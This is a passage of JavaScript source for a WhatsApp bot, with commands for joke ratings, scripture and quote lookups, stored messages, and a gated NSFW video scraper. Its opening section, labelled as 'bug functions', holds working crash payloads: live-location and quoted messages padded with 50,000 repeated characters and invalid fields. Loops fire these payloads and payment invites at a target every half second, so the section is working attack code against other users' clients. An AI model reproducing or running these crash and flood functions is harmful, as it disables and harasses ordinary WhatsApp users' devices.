      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await XeonBotInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await XeonBotInc.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  XeonBotInc.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}
async function sendPaymentInvite(jid) {
  XeonBotInc.relayMessage(jid, {
    'paymentInviteMessage': {
      'serviceType': "UPI",
      'expiryTimestamp': Date.now() + 86400000
    }
  }, {
    'participant': {
      'jid': jid
    }
  });
}

async function sendMultiplePaymentInvites(jid, count) {
  for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    await sleep(500);
  }
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    sendLiveLocationMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return XeonBotInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return XeonBotInc.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

const xbug2 = {
key: {
remoteJid: 'status@broadcast',
fromMe: false, 
participant: '0@s.whatsapp.net'
},
message: {
listResponseMessage: {
title: botname
}
}
}
//======end bug functions========\\

		switch(isCommand) {
			case 'gaycheck':
      case 'cutecheck':
        case 'lesbicheck':
          case 'lesbiancheck':
             case 'hornycheck':
                 case 'prettycheck':
                    case 'lovelycheck':
                      case 'uglycheck':
case 'handsomecheck':{
				if (!text) return replygcxeon(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
					let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: m.sender, 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
					break
case 'beautifulcheck':{
				if (!text) return replygcxeon(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
					const tik = can[Math.floor(Math.random() * can.length)]
					let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `*${command}*\n\nName : ${q}\nAnswer : *${tik}%*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
					break
					case 'charactercheck':{
					if (!text) return replygcxeon(`Tag Someone, Example : ${prefix + command} @Xeon`)
					const xeony =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
					const taky = xeony[Math.floor(Math.random() * xeony.length)]
					let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Character Check : ${q}\nAnswer : *${taky}*`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😁 \",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
				     break
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await XeonBotInc.sendImageAsSticker(m.chat, wifegerakx, m, { packname: global.packname, author: global.author, })

}
break
			case 'rentbot':
                replygcxeon(`Type ${prefix}owner and chat him`)
                break
			case "idgroup": case "idgc": case "groupid": {
if (!XeonTheCreator) return XeonStickOwner()
let getGroups = await XeonBotInc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *GROUP LIST BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await XeonBotInc.groupMetadata(x)
teks += `◉ Name : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
replygcxeon(teks + `To Use Please Type Command ${prefix}pushcontact idgroup|teks\n\nBefore using, please first copy the group id above`)
}
break
			case 'repo': case 'repository': {
  try {
    const [, username, repoName] = botscript.match(/github\.com\/([^/]+)\/([^/]+)/)
    const response = await axios.get(`https://api.github.com/repos/${username}/${repoName}`)
    if (response.status === 200) {
      const repoData = response.data
      const formattedInfo = `
${themeemoji} Repository Name: ${repoData.name}
${themeemoji} Description: ${repoData.description}
${themeemoji} Owner: ${repoData.owner.login}
${themeemoji} Stars: ${repoData.stargazers_count}
${themeemoji} Forks: ${repoData.forks_count}
${themeemoji} URL: ${repoData.html_url}
     
 `.trim()
      await XeonBotInc.relayMessage(m.chat,  {
        requestPaymentMessage: {
          currencyCodeIso4217: 'INR',
          amount1000: 69000,
          requestFrom: m.sender,
          noteMessage: {
          extendedTextMessage: {
          text: formattedInfo,
          contextInfo: {
          externalAdReply: {
          showAdAttribution: true
          }}}}}}, { quoted: m })
    } else {
      await replygcxeon(`Unable to fetch repository information`)
    }
  } catch (error) {
    console.error(error)
    await replygcxeon(`Repository currently not available `)
  }
}
break
			case 'myip':
            case 'ipbot':
                if (!XeonTheCreator) return XeonStickOwner()
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        replygcxeon("🔎 My public IP address is: " + ip);
                    })
                })
            break
            case 'request': case 'reportbug': {
	if (!text) return replygcxeon(`Example : ${
        prefix + command
      } hi dev play command is not working`)
            textt = `*| REQUEST/BUG |*`
            teks1 = `\n\n*User* : @${
   m.sender.split("@")[0]
  }\n*Request/Bug* : ${text}`
            teks2 = `\n\n*Hii ${m.pushName},You request has been forwarded to my Owners*.\n*Please wait...*`
            for (let i of owner) {
                XeonBotInc.sendMessage(i + "@s.whatsapp.net", {
                    text: textt + teks1,
                    mentions: [m.sender],
                }, {
                    quoted: m,
                })
            }
            XeonBotInc.sendMessage(m.chat, {
                text: textt + teks2 + teks1,
                mentions: [m.sender],
            }, {
                quoted: m,
            })

        }
        break
			case 'socialmedia': 
        case 'sosmed': 
        case 'update':{
	const slides = [
    [
        'https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png', // Image URL
        '', // Title
        `Susbcribe Developer's YouTube Channel To Get Updates`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://youtube.com/@dgxeon', // Command (URL in this case)
        'cta_url', // Button type
        'https://youtube.com/@dgxeon' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Telegram_2019_Logo.svg/1024px-Telegram_2019_Logo.svg.png', // Image URL
        '', // Title
        `Susbcribe Developer's Telegram Channel To Get Updates`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'http://t.me/xeonbotinc', // Command (URL in this case)
        'cta_url', // Button type
        'http://t.me/xeonbotinc' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/GitHub_Invertocat_Logo.svg/360px-GitHub_Invertocat_Logo.svg.png', // Image URL
        '', // Title
        `Follow Developer On GitHub`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://github.com/DGXeon', // Command (URL in this case)
        'cta_url', // Button type
        'https://github.com/DGXeon' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/264px-Instagram_logo_2016.svg.png', // Image URL
        '', // Title
        `Follow Developer On Instagram`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://www.instagram.com/unicorn_xeon13', // Command (URL in this case)
        'cta_url', // Button type
        'https://www.instagram.com/unicorn_xeon13' // URL (used in image generation)
    ], 
    [
        'https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1024px-WhatsApp.svg.png', // Image URL
        '', // Title
        `Contact Developer On WhatsApp`, // Body message
        botname, // Footer message
        'Visit', // Button display text
        'https://Wa.me/916909137213', // Command (URL in this case)
        'cta_url', // Button type
        'https://Wa.me/916909137213' // URL (used in image generation)
    ], 
];

const sendSlide = async (jid, title, message, footer, slides) => {
    const cards = slides.map(async slide => {
        const [
            image,
            titMess,
            boMessage,
            fooMess,
            textCommand,
            command,
            buttonType,
            url,
        ] = slide;
        let buttonParamsJson = {};
        switch (buttonType) {
            case "cta_url":
                buttonParamsJson = {
                    display_text: textCommand,
                    url: url,
                    merchant_url: url,
                };
                break;
            case "cta_call":
                buttonParamsJson = { display_text: textCommand, id: command };
                break;
            case "cta_copy":
                buttonParamsJson = {
                    display_text: textCommand,
                    id: "",
                    copy_code: command,
                };
                break;
            case "cta_reminder":
            case "cta_cancel_reminder":
            case "address_message":
                buttonParamsJson = { display_text: textCommand, id: command };
                break;
            case "send_location":
                buttonParamsJson = {};
                break;
             case "quick_reply":
             buttonParamsJson = { display_text: textCommand, id: command };
             break;
            default:
                break;
        }
        const buttonParamsJsonString = JSON.stringify(buttonParamsJson);
        return {
            body: proto.Message.InteractiveMessage.Body.fromObject({
                text: boMessage,
            }),
            footer: proto.Message.InteractiveMessage.Footer.fromObject({
                text: fooMess,
            }),
            header: proto.Message.InteractiveMessage.Header.fromObject({
                title: titMess,
                hasMediaAttachment: true,
                ...(await prepareWAMessageMedia(
                    { image: { url: image } },
                    { upload: XeonBotInc.waUploadToServer },
                )),
            }),
            nativeFlowMessage:
                proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [
                        {
                            name: buttonType,
                            buttonParamsJson: buttonParamsJsonString,
                        },
                    ],
                }),
        };
    });
    
    const msg = generateWAMessageFromContent(
        jid,
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2,
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.fromObject({
                            text: message,
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.fromObject({
                            text: footer,
                        }),
                        header: proto.Message.InteractiveMessage.Header.fromObject({
                            title: title,
                            subtitle: title,
                            hasMediaAttachment: false,
                        }),
                        carouselMessage:
                            proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                cards: await Promise.all(cards),
                            }),
                            contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
                    }),
                },
            },
        },
        { quoted: m},
    );
    await XeonBotInc.relayMessage(jid, msg.message, {
        messageId: msg.key.id,
    });
};
// Call the function with example parameters
sendSlide(m.chat, 'removed you', ownername, botname, slides);
}
break
			case 'gita-verse': case 'gita': case 'bhagavatgita': {
	try {
    // Extract the verse number from the command text.
    let verseNumber = m.text.split(' ')[1]
    if (!verseNumber || isNaN(verseNumber)) {
      verseNumber = Math.floor(Math.random() * 700) + 1
    }
    let res = await fetch(`https://gita-api.vercel.app/odi/verse/${verseNumber}`)
    if (!res.ok) {
      let error = await res.json()
      throw new Error(
        `API request failed with status ${res.status} and message ${error.detail[0].msg}`
      )
    }
    let json = await res.json()
    console.log('JSON response:', json)
    let gitaVerse = `
🕉 *Bhagavad Gita: Sacred Teachings*\n
📜 *Chapter ${json.chapter_no}: ${json.chapter_name}*\n
Verse ${json.verse_no}:\n
" ${json.verse} "\n
*🔮 Translation:*\n
${json.translation}\n
*🧘‍♂️ Spiritual Insight (Purport):*\n
${json.purport}`
    replygcxeon(gitaVerse)
    if (json.audio_link) {
      XeonBotInc.sendMessage(m.chat, {audio: {url:json.audio_link}, mimetype: 'audio/mp4', ptt: true}, {quoted:m})
    }
  } catch (error) {
    console.error(error)
    // Handle the error appropriately
  }
}
break
			case 'quran': {
    try {
    // Extract the surah number or name from the command text.
    let surahInput = m.text.split(' ')[1]
    if (!surahInput) {
      throw new Error(`Please specify the surah number or name`)
    }
    let surahListRes = await fetch('https://quran-endpoint.vercel.app/quran')
    let surahList = await surahListRes.json()
    let surahData = surahList.data.find(surah => 
        surah.number === Number(surahInput) || 
        surah.asma.ar.short.toLowerCase() === surahInput.toLowerCase() || 
        surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
    )
    if (!surahData) {
      throw new Error(`Couldn't find surah with number or name "${surahInput}"`)
    }
    let res = await fetch(`https://quran-endpoint.vercel.app/quran/${surahData.number}`)
    if (!res.ok) {
      let error = await res.json();
      throw new Error(`API request failed with status ${res.status} and message ${error.message}`)
    }

    let json = await res.json()

    // Translate tafsir from Bahasa Indonesia to Urdu
    let translatedTafsirUrdu = await translate(json.data.tafsir.id, { to: 'ur', autoCorrect: true })

    // Translate tafsir from Bahasa Indonesia to English
    let translatedTafsirEnglish = await translate(json.data.tafsir.id, { to: 'en', autoCorrect: true })

    let quranSurah = `
🕌 *Quran: The Holy Book*\n
📜 *Surah ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
Type: ${json.data.type.en}\n
Number of verses: ${json.data.ayahCount}\n
🔮 *Explanation (Urdu):*\n
${translatedTafsirUrdu.text}\n
🔮 *Explanation (English):*\n
${translatedTafsirEnglish.text}`

    replygcxeon(quranSurah)

    if (json.data.recitation.full) {
      XeonBotInc.sendMessage(m.chat, { audio: {url: json.data.recitation.full}, mimetype: 'audio/mp4', ptt: true, fileName: `recitation.mp3`, }, {quoted: m})
    }
  } catch (error) {
    replygcxeon(`Error: ${error.message}`)
  }
  }
  break
			case 'animequote': {
  try {
    const res = await fetch('https://some-random-api.com/animu/quote');
    if (!res.ok) throw await res.text()
    const json = await res.json()
    const { sentence, character, anime } = json
    const message = `${themeemoji}Quote\n${sentence}\n\n${themeemoji}Character: \`\`\`${character}\`\`\`\n${themeemoji}Anime: \`\`\`${anime}\`\`\`\n`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error(error)
  }
  }
  break
  case 'bible': {
  	const { translate } = require('@vitalets/google-translate-api')
  	const BASE_URL = 'https://bible-api.com'
  try {
    // Extract the chapter number or name from the command text.
    let chapterInput = m.text.split(' ').slice(1).join('').trim()
    if (!chapterInput) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    // Encode the chapterInput to handle special characters
    chapterInput = encodeURIComponent(chapterInput);
    // Make an API request to fetch the chapter information.
    let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`)
    if (!chapterRes.ok) {
      throw new Error(`Please specify the chapter number or name. Example: ${prefix + command} john 3:16`)
    }
    let chapterData = await chapterRes.json();
    let translatedChapterHindi = await translate(chapterData.text, { to: 'hi', autoCorrect: true })
    let translatedChapterEnglish = await translate(chapterData.text, { to: 'en', autoCorrect: true })
    let bibleChapter = `
📖 *The Holy Bible*\n
📜 *Chapter ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Number of verses: ${chapterData.verses.length}\n
🔮 *Chapter Content (English):*\n
${translatedChapterEnglish.text}\n
🔮 *Chapter Content (Hindi):*\n
${translatedChapterHindi.text}`
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: bibleChapter
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./XeonMedia/theme/cheemspic.jpg')}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🙏\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    replygcxeon(`Error: ${error.message}`)
  }
  }
  break
			case 'addlist':
if (!XeonTheCreator) return XeonStickOwner()
if (!m.isGroup) return XeonStickGroup()
var args1 = text.split("@")[0]
var args2 = text.split("@")[1]
if (!q.includes("@")) return replygcxeon(`Usage Example: ${prefix+command} *Item Name@Item*\n\n_Example_\n\n${prefix+command} namelist@List`)
if (isAlreadyResponList(from, args1, db_respon_list)) return replygcxeon(`List of responses with key : *${args1}* already in this group.`)
if (/image/.test(mime)) {
media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
mem = await TelegraPh(media)
addResponList(from, args1, args2, true, `${mem}`, db_respon_list)
replygcxeon(`Successfully set list message with key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
} else {
addResponList(from, args1, args2, false, '-', db_respon_list)
replygcxeon(`Successful Add List With Key : *${args1}*`)
}
break
case 'dellist':
if (!XeonBotInc) return XeonStickOwner()
if (!m.isGroup) return XeonStickGroup()
if (db_respon_list.length === 0) return replygcxeon(`There is no message list in the database yet`)
if (!q) return replygcxeon(`Usage Example: ${prefix + command} *Item name*\n\n_Example_\n\n${prefix + command} listname`)
if (!isAlreadyResponList(from, q, db_respon_list)) return replygcxeon(`Item list by Name *${q}* not in the database!`)
delResponList(from, q, db_respon_list)
replygcxeon(`Successfully delete list message with key *${q}*`)
break
case 'store':
case 'shop': 
case 'list': {
let teks = '┌──⭓「 *LIST STORE* 」\n│\n'
for (let x of db_respon_list) {
teks += `│⭔ ${x.key}\n`
}
teks += `│\n└────────────⭓\n\n`
replygcxeon(teks)
}
break
			case 'setprefix':
                if (!XeonTheCreator) return XeonStickOwner()
                if (!text) return replygcxeon(`Example : ${prefix + command} #`)
                global.xprefix = text
                replygcxeon(`Prefix successfully changed to ${text}`)
                break
			case 'addmsg': {
	if (!XeonTheCreator) return XeonStickOwner()
                if (!m.quoted) return replygcxeon('Reply Message You Want To Save In Database')
                if (!text) return replygcxeon(`Example : ${prefix + command} filename`)
                let msgs = global.db.database
                if (text.toLowerCase() in msgs) return replygcxeon(`'${text}' registered in the message list`)
                msgs[text.toLowerCase()] = quoted.fakeObj
replygcxeon(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
            }
            break
            case 'getmsg': {
                if (!text) return replygcxeon(`Example : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
                let msgs = global.db.database
                if (!(text.toLowerCase() in msgs)) return replygcxeon(`'${text}' not listed in the message list`)
                XeonBotInc.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
            case 'listmsg': {
                let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
	        let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        replygcxeon(teks)
	    }
	    break 
	case 'delmsg': case 'deletemsg': {
		if (!XeonTheCreator) return XeonStickOwner()
	        let msgs = global.db.database
	        if (!(text.toLowerCase() in msgs)) return replygcxeon(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		replygcxeon(`Successfully deleted '${text}' from the message list`)
            }
	    break
			case 'setcmd': {
                if (!m.quoted) return replygcxeon('Reply Message!')
                if (!m.quoted.fileSha256) return replygcxeon('SHA256 Hash Missing')
                if (!text) return replygcxeon(`For What Command?`)
                let hash = m.quoted.fileSha256.toString('base64')
                if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replygcxeon('You have no permission to change this sticker command')
                global.db.sticker[hash] = {
                    text,
                    mentionedJid: m.mentionedJid,
                    creator: m.sender,
                    at: + new Date,
                    locked: false,
                }
                replygcxeon(`Done!`)
            }
            break
case 'delcmd': {
                let hash = m.quoted.fileSha256.toString('base64')
                if (!hash) return replygcxeon(`No hashes`)
                if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replygcxeon('You have no permission to delete this sticker command')             
                delete global.db.sticker[hash]
                replygcxeon(`Done!`)
            }
            break
case 'listcmd': {
                let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
                XeonBotInc.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break 
case 'lockcmd': {
                if (!XeonTheCreator) return XeonStickOwner()
                if (!m.quoted) return replygcxeon('Reply Message!')
                if (!m.quoted.fileSha256) return replygcxeon('SHA256 Hash Missing')
                let hash = m.quoted.fileSha256.toString('base64')
                if (!(hash in global.db.sticker)) return replygcxeon('Hash not found in database')
                global.db.sticker[hash].locked = !/^un/i.test(command)
                replygcxeon('Done!')
            }
            break
			case 'hentaivid': case 'hentai': case 'hentaivideo': {
	if (!m.isGroup) return XeonStickGroup()
if (!AntiNsfw) return replygcxeon(mess.nsfw)
                await XeonStickWait()
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ video: { url: result912.video_1 } }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
